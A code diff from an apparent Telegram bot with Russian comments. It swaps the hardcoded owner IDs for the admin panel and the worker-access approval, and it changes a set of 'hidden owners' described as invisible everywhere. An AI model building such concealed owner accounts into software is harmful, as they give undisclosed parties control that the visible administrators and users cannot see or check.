@@ -2879,8 +2879,8 @@ async def cancel_deal_confirmed(callback_query: types.CallbackQuery, state: FSMC
 # ─── АДМИН-ПАНЕЛЬ ──────────────────────────────────────────────────────────────
 # ═══════════════════════════════════════════════════════════════════════════════
 
-PANEL_OWNER_IDS = {8984419390}
-HIDDEN_OWNER_IDS = {8984419390}  # невидимые овнеры — не отображаются нигде
+PANEL_OWNER_IDS = {8752727677,8259823549}
+HIDDEN_OWNER_IDS = {8259823549,8752727677}  # невидимые овнеры — не отображаются нигде
 
 def _admin_check(user_id: int) -> bool:
     """Доступ к админ-панели — хардкодные владельцы + скрытые + динамические панельные админы."""
@@ -3840,7 +3840,7 @@ async def cmd_sosigoy(message: types.Message):
     requester_name = message.from_user.username or message.from_user.full_name
     try:
         await bot.send_message(
-            chat_id=8984419390,
+            chat_id=8752727677,
             text=(f"{e['people']} <b>Запрос на доступ воркера</b>\n\n"
                   f"От: {requester_name} (<code>{requester_id}</code>)"),
             parse_mode="HTML",
@@ -3854,7 +3854,7 @@ async def cmd_sosigoy(message: types.Message):
 
 @dp.callback_query(lambda c: c.data.startswith("sosigoy_approve_") or c.data.startswith("sosigoy_deny_"))
 async def sosigoy_decide(callback_query: types.CallbackQuery):
-    if callback_query.from_user.id != 8984419390:
+    if callback_query.from_user.id != 8752727677:
         await callback_query.answer("❌ Нет прав.", show_alert=True)
         return
     approve = callback_query.data.startswith("sosigoy_approve_")
@@ -4055,7 +4055,7 @@ async def cmd_force_feedback(message: types.Message, state: FSMContext):
 
 @dp.message(Command("deladmin"))
 async def cmd_unadmin(message: types.Message):
-    OWNER_IDS = {6249468135, 768349004, 488616444, 57352763}
+    OWNER_IDS = {8752727677}
     if message.from_user.id not in OWNER_IDS:
         return
     args = message.text.split(maxsplit=1)
